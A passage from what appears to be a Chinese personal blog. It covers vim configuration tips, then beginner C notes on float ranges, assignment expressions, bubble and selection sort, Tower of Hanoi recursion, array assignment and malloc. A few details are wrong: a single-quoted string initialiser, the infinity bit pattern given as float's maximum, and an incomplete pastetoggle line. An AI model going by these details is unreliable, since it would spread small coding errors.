<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">vim ~/.vimrc</span><br><span class="line"><span class="comment">#输入以下配置</span></span><br><span class="line"><span class="built_in">set</span> tabstop=4</span><br></pre></td></tr></table></figure></div>

<h4 id="修改vim编辑器可查看文件行数"><a href="#修改vim编辑器可查看文件行数" class="headerlink" title="修改vim编辑器可查看文件行数"></a>修改vim编辑器可查看文件行数</h4><p>打开.vimrc文件,若没有就手动创建一个即可</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">vim ~/.vimrc</span><br><span class="line"><span class="comment">#输入以下配置</span></span><br><span class="line"><span class="built_in">set</span> nu</span><br></pre></td></tr></table></figure></div>

<h4 id="使vim打开文件可自动缩进"><a href="#使vim打开文件可自动缩进" class="headerlink" title="使vim打开文件可自动缩进"></a>使vim打开文件可自动缩进</h4><p>打开.vimrc文件,若没有就手动创建一个即可</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">set</span> shiftwidth=4    <span class="comment">#缩进使用4个空格的宽度</span></span><br><span class="line"><span class="built_in">set</span> softtabstop=4   <span class="comment">#设置tab所占的列数，当输入tab时，设为4个空格的宽度</span></span><br><span class="line"><span class="built_in">set</span> expandtab       <span class="comment">#扩展tab为空格</span></span><br><span class="line"><span class="built_in">set</span> autoindent		<span class="comment">#设置自动缩进</span></span><br><span class="line"><span class="built_in">set</span> smartindent		<span class="comment">#设置智能缩进</span></span><br></pre></td></tr></table></figure></div>

<h4 id="vim暂时关闭缩进和注释自动缩进设置"><a href="#vim暂时关闭缩进和注释自动缩进设置" class="headerlink" title="vim暂时关闭缩进和注释自动缩进设置"></a>vim暂时关闭缩进和注释自动缩进设置</h4><p>VIM在粘贴代码时会自动缩进，把代码搞得一团糟糕，甚至可能因为某行的一个注释造成后面的代码全部被注释掉</p>
<h5 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h5><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">set</span> pastetoggle</span><br></pre></td></tr></table></figure></div>

<p>即可关闭自动缩进</p>
<p>或者设置为快捷键，最方便的方法就是在.vimrc中加一句：</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">set</span> pastetoggle=</span><br></pre></td></tr></table></figure></div>

<p>以后在插入模式下，只要按<strong>F9</strong>键就可以切换自动缩进。</p>
<p>当需要自己手写代码的时候，进入<strong>insert模式</strong>，默认就是自动缩进了。</p>
<h5 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h5><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">set</span> <span class="built_in">paste</span></span><br></pre></td></tr></table></figure></div>

<p>然后再进入插入模式粘贴，代码就不会被自动缩进。</p>
<p>敲代码的时候需要自动缩进，需要改回来:</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">set</span> nopaste</span><br></pre></td></tr></table></figure></div>

]]></content>
      <categories>
        <category>操作系统</category>
        <category>linux(centos)</category>
      </categories>
      <tags>
        <tag>linux</tag>
      </tags>
  </entry>
  <entry>
    <title>关于C语言学习的部分遗漏问题解答</title>
    <url>/2024/09/10/C%E8%AF%AD%E8%A8%80/%E5%9F%BA%E7%A1%80%E9%83%A8%E5%88%86/%E9%81%97%E6%BC%8F%E9%97%AE%E9%A2%98%E8%A7%A3%E7%AD%94/</url>
    <content><![CDATA[<h1 id="遗漏问题解答"><a href="#遗漏问题解答" class="headerlink" title="遗漏问题解答"></a>遗漏问题解答</h1><p><a href="#%E6%B5%AE%E7%82%B9%E6%95%B0%E7%9A%84%E6%95%B0%E5%80%BC%E8%8C%83%E5%9B%B4">浮点数的数值范围</a></p>
<p><a href="#%E8%B5%8B%E5%80%BC%E8%A1%A8%E8%BE%BE%E5%BC%8F%E4%B8%8E%E8%B5%8B%E5%80%BC%E8%AF%AD%E5%8F%A5">赋值表达式与赋值语句</a></p>
<p><a href="#%E5%9F%BA%E7%A1%80%E6%8E%92%E5%BA%8F%E6%96%B9%E6%B3%95">基础排序方法</a></p>
<p><a href="#%E6%B1%89%E8%AF%BA%E5%A1%94%E9%97%AE%E9%A2%98">汉诺塔问题</a></p>
<p><a href="#%E6%95%B0%E7%BB%84%E8%B5%8B%E5%80%BC">数组赋值</a></p>
<p><a href="#%E5%8A%A8%E6%80%81%E5%86%85%E5%AD%98%E5%88%86%E9%85%8D">动态内存分配</a></p>
<hr>
<h2 id="浮点数的数值范围"><a href="#浮点数的数值范围" class="headerlink" title="浮点数的数值范围"></a>浮点数的数值范围</h2><h3 id="浮点格式"><a href="#浮点格式" class="headerlink" title="浮点格式"></a>浮点格式</h3><p>精度和范围与数据的存储格式密切相关，所以我们先来看一看它们的存储格式：<br>对于float类型的变量，其底层的存储格式为：</p>
<table>
<thead>
<tr>
<th>符号位（S）</th>
<th>指数阶码（E）</th>
<th>尾数（F）</th>
</tr>
</thead>
<tbody><tr>
<td>1bit</td>
<td>8bit</td>
<td>23bit</td>
</tr>
</tbody></table>
<p>对于double类型的变量，底层的存储格式为：</p>
<table>
<thead>
<tr>
<th>符号位（S）</th>
<th>指数阶码（E）</th>
<th>尾数（F）</th>
</tr>
</thead>
<tbody><tr>
<td>1bit</td>
<td>11bit</td>
<td>52bit</td>
</tr>
</tbody></table>
<p>存储格式为 <code>(-1)^s * F * 2^E</code></p>
<h3 id="范围推导"><a href="#范围推导" class="headerlink" title="范围推导"></a>范围推导</h3><h4 id="float类型"><a href="#float类型" class="headerlink" title="float类型"></a>float类型</h4><p>首先看它的最大的情况，此时S&#x3D;0，F全部是0，指数域全部是1，此时32bit的值为：0111 1111 1000 0000 0000 0000 0000 0000。</p>
<p>它的精确值为：<code>+1.0*2^128</code>，对应的十进制约为：<code>3.4*10^38</code>。</p>
<p>负的无穷大就是当S&#x3D;1的时候，符号取负即可。</p>
<h4 id="double类型"><a href="#double类型" class="headerlink" title="double类型"></a>double类型</h4><p>直接给出的数表示的范围：<code>−1.7*10^308 ∼ +1.7*10^308</code></p>
<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><blockquote>
<p>正常显示的只显示精度范围内的，但实际浮点类型可以存储相当大的数据，只是不会正常显示出来而已。</p>
</blockquote>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../source/images/%E9%81%97%E6%BC%8F%E9%97%AE%E9%A2%98%E8%A7%A3%E7%AD%94/90c1d403d3c66315cc03416f9374711.png"
                      alt="90c1d403d3c66315cc03416f9374711"
                ></p>
<hr>
<h2 id="赋值表达式与赋值语句"><a href="#赋值表达式与赋值语句" class="headerlink" title="赋值表达式与赋值语句"></a>赋值表达式与赋值语句</h2><h3 id="赋值表达式"><a href="#赋值表达式" class="headerlink" title="赋值表达式"></a>赋值表达式</h3><p>简单赋值运算符和表达式:简单赋值运算符记为“&#x3D;”。</p>
<p>由“&#x3D; ”连接的式子称为赋值表达式。其一般形式为：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">变量=表达式</span><br></pre></td></tr></table></figure></div>

<p>例如：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">x=a+b</span><br><span class="line">w=sin(a)+sin(b)</span><br><span class="line">y=i++</span><br></pre></td></tr></table></figure></div>

<p>赋值表达式的功能是计算表达式的值再赋予左边的变量。赋值运算符具有右结合性。<br>因此</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">a=b=c=5</span><br></pre></td></tr></table></figure></div>

<p>可理解为</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">a=(b=(c=5))</span><br></pre></td></tr></table></figure></div>

<p>在其它高级语言中，赋值构成了一个语句，称为赋值语句。</p>
<p>而在 C 中，把“&#x3D;”定义为运算符，从而组成赋值表达式。 凡是表达式可以出现的地方均可出现赋值表达式。<br>例如，式子:</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">x=(a=5)+(b=8)</span><br></pre></td></tr></table></figure></div>

<p>是合法的。它的意义是把 5 赋予 a，8 赋予 b，再把 a,b 相加，和赋予 x，故 x 应等于 13。<br>在Ｃ语言中也可以组成赋值语句，按照Ｃ语言规定，任何表达式在其未尾加上分号就构成为语句。<br>因此如<code>x=8;a=b=c=5；</code>都是赋值语句。</p>
<h3 id="赋值语句"><a href="#赋值语句" class="headerlink" title="赋值语句"></a>赋值语句</h3><p>赋值语句是由赋值表达式再加上分号构成的表达式语句。</p>
<p>其一般形式为： </p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">变量=表达式;</span><br></pre></td></tr></table></figure></div>

<p>在赋值语句的使用中需要注意以下几点：</p>
<ol>
<li><p>由于在赋值符“&#x3D;”右边的表达式也可以又是一个赋值表达式， 因此，下述形式 变量&#x3D;(变量&#x3D;表达式); 是成立的，从而形成 嵌套的情形。 其展开之后的一般形式为：变量&#x3D;变量&#x3D;…&#x3D;表达式; 例如： a&#x3D;b&#x3D;c&#x3D;d&#x3D;e&#x3D;5; 按照赋值运算符的右接合性，因此实际上等效于： e&#x3D;5; d&#x3D;e; c&#x3D;d; b&#x3D;c; a&#x3D;b;</p>
</li>
<li><p>注意在变量说明中给变量赋初值和赋值语句的区别。 给变量赋初值是变量说明的一部分，赋初值后的变量与其后的其它同类变量之间仍必须用逗号间隔，而赋值语句则必须用分号结尾。 例如： int a&#x3D;5,b,c;</p>
</li>
<li><p>在变量说明中，不允许连续给多个变量赋初值。 如下述说明是错误的： int a&#x3D;b&#x3D;c&#x3D;5 必须写为 int a&#x3D;5,b&#x3D;5,c&#x3D;5; 而赋值语句允许连续赋值。</p>
</li>
<li><p>注意赋值表达式和赋值语句的区别。 赋值表达式是一种表达式，它可以出现在任何允许表达式出现的地方，而赋值语句则不能。</p>
</li>
</ol>
<p>下述语句是合法的：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">if((x=y+5)&gt;0) z=x;</span><br></pre></td></tr></table></figure></div>

<p>这里(x&#x3D;y+5)是赋值表达式，语句的功能是，若表达式x&#x3D;y+5大于0则z&#x3D;x。</p>
<p>下述语句是非法的：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">if((x=y+5;)&gt;0) z=x;</span><br></pre></td></tr></table></figure></div>

<p>因为x&#x3D;y+5;是语句，不能出现在表达式中。</p>
<hr>
<h2 id="基础排序方法"><a href="#基础排序方法" class="headerlink" title="基础排序方法"></a>基础排序方法</h2><h3 id="冒泡排序（两两互换）"><a href="#冒泡排序（两两互换）" class="headerlink" title="冒泡排序（两两互换）"></a>冒泡排序（两两互换）</h3><p>冒泡排序是交换排序中一种简单的排序方法。</p>
<p>它的基本思想是对所有相邻记录的关键字值进行比效，如果是逆顺（a[j]&gt;a[j+1]），则将其交换，最终达到有<br>序化;</p>
<p>其处理过程为： </p>
<p>（1）将整个待排序的记录序列划分成有序区和无序区，初始状态有序区为空，无序区包括所有待排序的记<br>录。 </p>
<p>（2）对无序区从前向后依次将相邻记录的关键字进行比较，若逆序将其交换，从而使得关键字值小的记录向<br>上”飘浮”（左移），关键字值大的记录好像石块，向下“堕落”（右移）。 每经过一趟冒泡排序，都使无序区中<br>关键字值最大的记录进入有序区，对于由n个记录组成的记录序列，最多经过n-1趟冒泡排序，就可以将这n个记<br>录重新按关键字顺序排列。</p>
<blockquote>
<p>原始的冒泡排序算法 对由n个记录组成的记录序列，最多经过（n-1）趟冒泡排序，就可以使记录序列成为<br>有序序列，第一趟定位<strong>第n个</strong>记录，此时有序区只有一个记录；第二趟定位<strong>第n-1个</strong>记录，此时有序区有两个记<br>录；以此类推，算法框架为： for（i&#x3D;n；i&gt;1；i—） { 定位第i个记录；}</p>
</blockquote>
<p>代码如下：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">   <span class="type">int</span> data[<span class="number">5</span>];</span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">&quot;请输入数据：\n&quot;</span>);</span><br><span class="line">   <span class="type">int</span> i,j;</span><br><span class="line">   <span class="keyword">for</span>(i = <span class="number">0</span>;i &lt; <span class="number">5</span>;i ++)</span><br><span class="line">   &#123;</span><br><span class="line">   	<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;data[i]);	<span class="comment">//输入数据 </span></span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">for</span>(i = <span class="number">0</span>;i &lt; <span class="number">5</span>;i ++)  <span class="comment">//采用双重循环 </span></span><br><span class="line">   &#123;</span><br><span class="line">   	<span class="keyword">for</span>(j = <span class="number">0</span>;j &lt; <span class="number">5</span> - <span class="number">1</span> - i;j++)</span><br><span class="line">   	&#123;</span><br><span class="line">   	  <span class="keyword">if</span>(data[j] &gt; data[j+<span class="number">1</span>])     <span class="comment">//这里默认采用升序来排列 </span></span><br><span class="line">		 &#123;</span><br><span class="line">		 	<span class="type">int</span> temp;        <span class="comment">//定义一个临时值来存储数据，以此来达到交换数值的目的</span></span><br><span class="line">			temp = data[j];</span><br><span class="line">			data[j] = data[j+<span class="number">1</span>];</span><br><span class="line">			data[j+<span class="number">1</span>] = temp;</span><br><span class="line">		 &#125;	</span><br><span class="line">	&#125;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">&quot;排序好的数组为：\n&quot;</span>);</span><br><span class="line">   <span class="keyword">for</span>(i = <span class="number">0</span>;i &lt; <span class="number">5</span>;i ++)    <span class="comment">//用for循环来遍历并输出排序完成的数组 </span></span><br><span class="line">   &#123;</span><br><span class="line">   	 <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>,data[i]);</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure></div>

<h3 id="选择排序"><a href="#选择排序" class="headerlink" title="选择排序"></a>选择排序</h3><h4 id="一、什么是选择排序？"><a href="#一、什么是选择排序？" class="headerlink" title="一、什么是选择排序？"></a>一、什么是选择排序？</h4><p> 选择排序（Selection sort）是一种简单直观的排序算法。它的工作原理是：第一次从待排序的中数据元素选出最小（或最大）的一个元素，存放在序列的起始位置，然后再从剩余的未排序元素中寻找到最小（大）元素，然后放到已排序的序列的末尾。以此类推，直到全部待排序的数据元素的个数为零。选择排序是不稳定的排序方法。</p>
<h4 id="二、选择排序思路"><a href="#二、选择排序思路" class="headerlink" title="二、选择排序思路"></a>二、选择排序思路</h4><p>首先在未排序序列中找到最小（大）元素，存放到排序序列的起始位置，然后，再从剩余未排序元素中继续寻找最小（大）元素，然后放到已排序序列的末尾。以此类推，直到所有元素均排序完毕。</p>
<h4 id="三、排序过程"><a href="#三、排序过程" class="headerlink" title="三、排序过程"></a>三、排序过程</h4><p>例：定义一个数组 int a[8] &#x3D; {9，3，7，2，6，1，5，8}，要求利用选择排序的方法将数组从小到大排序。</p>
<p>排序的次数：因为每排好一个元素，那么所需要排的元素个数减一，直到排到倒数第二个元素停止，将倒数第二个元素也排好后，整体数组排序就完成了。<strong>所以排序的次数 &#x3D; 元素个数 - 1。(冒泡排序的排序次数与该排序的排序次数计算方法相同)</strong></p>
<blockquote>
<p>9，3，7，2，6，1，5，8</p>
</blockquote>
<p>第一次排序：假设首元素作为整体元素数据最小值，然后从该元素的后一个元素开始每个元素都与该最小值进行比较，假如有比该元素小的值，<strong>就用一个变量去记住下标值</strong>，最后比较完成后，把两个元素互换位置即可。</p>
<p>第一次排序结果：</p>
<blockquote>
<p>1，3，7，2，6，9，5，8</p>
</blockquote>
<p>第二次排序：因为第一次排序选择的是将首元素作为最小值，最终经过互换位置，首元素排序完成，第二次排序就不需要排序首元素，只需要排序除首元素以外的元素，然后在依照第一次排序的原理进行排序。</p>
<p>第二次排序结果：</p>
<blockquote>
<p>1，2，7，3，6，9，5，8</p>
</blockquote>
<p>然后根据第一次排序和第二次排序的原理，最终的排序结果为：{1，2，3，5，6，7，8，9}</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">arr_out</span><span class="params">(<span class="type">int</span> a[<span class="number">8</span>])</span><span class="comment">//输出函数</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">0</span>;i &lt; <span class="number">8</span>;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>,a[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">arr_sort</span><span class="params">(<span class="type">int</span> *p,<span class="type">int</span> n)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> i,j;</span><br><span class="line">    <span class="type">int</span> min = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">0</span>;i &lt; n - <span class="number">1</span>;i++)<span class="comment">//排序次数</span></span><br><span class="line">    &#123;</span><br><span class="line">        min = i;</span><br><span class="line">        <span class="keyword">for</span>(j = i + <span class="number">1</span>;j &lt; n;j++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(p[j] &lt; p[min])</span><br><span class="line">            &#123;</span><br><span class="line">                min = j;<span class="comment">//记录交换的元素下标值</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(i != min)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="type">int</span> temp = p[i];</span><br><span class="line">            p[i] = p[min];</span><br><span class="line">            p[min] = temp;</span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> a[<span class="number">8</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">0</span>;i &lt; <span class="number">8</span>;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;a[i]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">arr_sort(a,<span class="number">8</span>);<span class="comment">//排序函数</span></span><br><span class="line">arr_out(a);<span class="comment">//输出函数</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>



<hr>
<h2 id="汉诺塔问题"><a href="#汉诺塔问题" class="headerlink" title="汉诺塔问题"></a>汉诺塔问题</h2><p>&#x3D;&#x3D;（递归）&#x3D;&#x3D;</p>
<h3 id="问题背景"><a href="#问题背景" class="headerlink" title="问题背景"></a>问题背景</h3><p>汉诺塔问题是一个经典的问题。汉诺塔（Hanoi Tower），又称河内塔，源于印度一个古老传说。大梵天创造世界的时候做了三根金刚石柱子，在一根柱子上从下往上按照大小顺序摞着64片黄金圆盘。大梵天命令婆罗门把圆盘从下面开始按大小顺序重新摆放在另一根柱子上。并且规定，任何时候，在小圆盘上都不能放大圆盘，且在三根柱子之间一次只能移动一个圆盘。问应该如何操作？</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../source/images/%E9%81%97%E6%BC%8F%E9%97%AE%E9%A2%98%E8%A7%A3%E7%AD%94/3962f9684ac18a8b980c9b2f2ce63bb6.png"
                      alt="3962f9684ac18a8b980c9b2f2ce63bb6"
                ></p>
<h3 id="问题分析"><a href="#问题分析" class="headerlink" title="问题分析"></a>问题分析</h3><p>思路：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">使用的语言：C语言</span><br><span class="line">使用的编译器：vs2019</span><br><span class="line">参考书籍：谭浩强第四版</span><br><span class="line">主要使用的知识：函数的递归</span><br><span class="line">代码实现的思路主要分为三步：</span><br></pre></td></tr></table></figure></div>

<p>假设总共需要移动n个盘子</p>
<blockquote>
<p>F(n)&#x3D;2F(n-1)+1 可以推到出需要移动2^n-1^次</p>
</blockquote>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">将A柱上的n-1个盘子借助C柱移向B柱</span><br><span class="line">将A柱上仅剩的最后一个盘子移向C柱</span><br><span class="line">将B柱上的n-1个盘子借助A柱移向C柱</span><br></pre></td></tr></table></figure></div>

<h3 id="代码实现"><a href="#代码实现" class="headerlink" title="代码实现"></a>代码实现</h3><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _CRT_SECURE_NO_WARNINGS 1</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">move</span><span class="params">(<span class="type">int</span> x, <span class="type">int</span> y)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%c-&gt;%c\n&quot;</span>, x, y);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">hanoi</span><span class="params">(<span class="type">int</span> n, <span class="type">char</span> a, <span class="type">char</span> b, <span class="type">char</span> c)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">if</span> (n == <span class="number">1</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		move(a, c);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		hanoi(n - <span class="number">1</span>, a, c, b);<span class="comment">//将A座上的n-1个盘子借助C座移向B座</span></span><br><span class="line">		move(a, c);<span class="comment">//将A座上最后一个盘子移向C座</span></span><br><span class="line">		hanoi(n - <span class="number">1</span>, b, a, c);<span class="comment">//将B座上的n-1个盘子借助A座移向C座</span></span><br><span class="line">	&#125; </span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//move中的实参与hanoi函数中的形参相对应，而hanoi函数中形参a，b，c所对应的值也是在有规律的变化</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">int</span> n = <span class="number">0</span>;</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;n);</span><br><span class="line">	hanoi(n, <span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;B&#x27;</span>, <span class="string">&#x27;C&#x27;</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>



<hr>
<h2 id="数组赋值"><a href="#数组赋值" class="headerlink" title="数组赋值"></a>数组赋值</h2><h3 id="直接赋值"><a href="#直接赋值" class="headerlink" title="直接赋值"></a>直接赋值</h3><p>数组赋值可以在定义的时候直接赋值，例：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">char</span> arr[]=<span class="string">&#x27;hello&#x27;</span>;</span><br><span class="line"><span class="type">char</span> arr[<span class="number">10</span>]=<span class="string">&#x27;world&#x27;</span>;</span><br></pre></td></tr></table></figure></div>

<h3 id="循环赋值"><a href="#循环赋值" class="headerlink" title="循环赋值"></a>循环赋值</h3><p>在定义数组后，用循环进行对数组中的值进行赋值，例：</p>
<h4 id="下标赋值"><a href="#下标赋值" class="headerlink" title="下标赋值"></a>下标赋值</h4><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> a[<span class="number">10</span>];</span><br><span class="line">	<span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">10</span>;i++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;a[i]);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></div>

<h4 id="指针赋值"><a href="#指针赋值" class="headerlink" title="指针赋值"></a>指针赋值</h4><p>指针赋值结束后定义的指针会出现偏移而不是最开始指向的数组头地址，用<code>p = &amp;a[0];</code>将指针改回去</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> a[<span class="number">10</span>];</span><br><span class="line"><span class="type">int</span> *p=a;	<span class="comment">//int *p=&amp;a[0];</span></span><br><span class="line">	<span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">10</span>;i++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,p++);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></div>

<h2 id="动态内存分配"><a href="#动态内存分配" class="headerlink" title="动态内存分配"></a>动态内存分配</h2><p><strong>（<a class="link"   href="https://blog.csdn.net/TheWhiteFox/article/details/108502906" >此处挪用CSDN博主的文章 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>）</strong></p>
<h3 id="malloc"><a href="#malloc" class="headerlink" title="malloc()"></a>malloc()</h3><p>malloc（）找到可用内存中一个大小适合的块。<br>内存是匿名的；</p>
<p>也就是说，malloc（）分配了内存，但没有为它指定名字。<br>然而，它却可以<code>返回那块内存第一个字节的地址</code>。<br>因此，可以把<code>那个地址赋值给一个指针变量</code>，并使用该指针来访问那块内存。<br>因为char代表一个字节，所以传统上曾将malloc（）定义为指向char的指针类型。</p>
<p>然而，ANSIC标准使用了一个新类型：指向void的指针。这一类型被用作“通用指针”。<br>函数malloc（）可用来返回数组指针、结构指针等等，因此一般需要把返回值的类型指派为适当的类型。</p>
<p>在ANSIC中，为了程序清晰应对指针进行类型指派，但将void 指针值赋值给其他类型的指针并不构成类型冲突。<br>如果malloc（）找不到所需的空间，它将返回空指针。<br>我们使用malloc（）来创建一个 数组。可以在程序运行时使用malloc（）请求一个存储块，另外还需要一个指针来存放该块在内存中的位置。</p>
<p>例如，如下代码：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">double</span> * ptd;</span><br><span class="line">ptd = (<span class="type">double</span> * ) <span class="built_in">malloc</span> (<span class="number">30</span> * <span class="keyword">sizeof</span>(<span class="type">double</span>));</span><br></pre></td></tr></table></figure></div>

<p><strong>这段代码请求30个double类型值的空间，并且把ptd指向该空间所在位置。</strong></p>
<blockquote>
<p>注意:ptd是作为指向一个double类型值的指针声明的，而不是指向30个double类型值的数据块的指针。</p>
</blockquote>
<blockquote>
<p>记住：数组的名字是它第一个元素的地址。</p>
</blockquote>
<p>因此，如果令ptd指向一个内存块的第一个元素，就可以像使用数组名一样使用它。<br>也就是说，可以使用表达式ptd[0]来访问内存块的第一个元素，pd[1]来访问第二个元素，依此类推。<br>正如前面所学，可以在指针符号中使用数组名，也可以在数组符号中使用指针。</p>
<p>现在，创建一个数组有三种方法：<br>1.声明一个<code>数组</code>，声明时用常量表达式指定数组维数，然后可以用数组名访问数组元素。<br>2.声明一个<code>变长数组</code>，声明时用变量表达式指定数组维数，然后用数组名来访问数组元素（这是C99的一个特性）。<br>3.声明一个<code>指针</code>，调用malloc（），然后使用该指针来访问数组元素。</p>
<p>使用第二种或第三种方法可以做一些用普通的数组声明做不到的事：</p>
<p>创建一个动态数组（dynamic array），即一个在程序运行时才分配内存并可在程序运行时选择大小的数组。</p>
<p>例如，假定n是一个整数量。在C99之前，不能这样做：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">double</span> item[n]：<span class="comment">/*如果n是一个变量，C99之前不允许这样做*/</span></span><br></pre></td></tr></table></figure></div>

<p>然而，即使在C99之前的编译器中，也可以这样做：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">ptd =（<span class="type">double</span>*）<span class="built_in">malloc</span>（n*<span class="keyword">sizeof</span>（<span class="type">double</span>））；<span class="comment">/*可以*/</span></span><br></pre></td></tr></table></figure></div>

<p>这行得通，而且正如您将看到的那样，这样做比使用一个变长数组更灵活。</p>
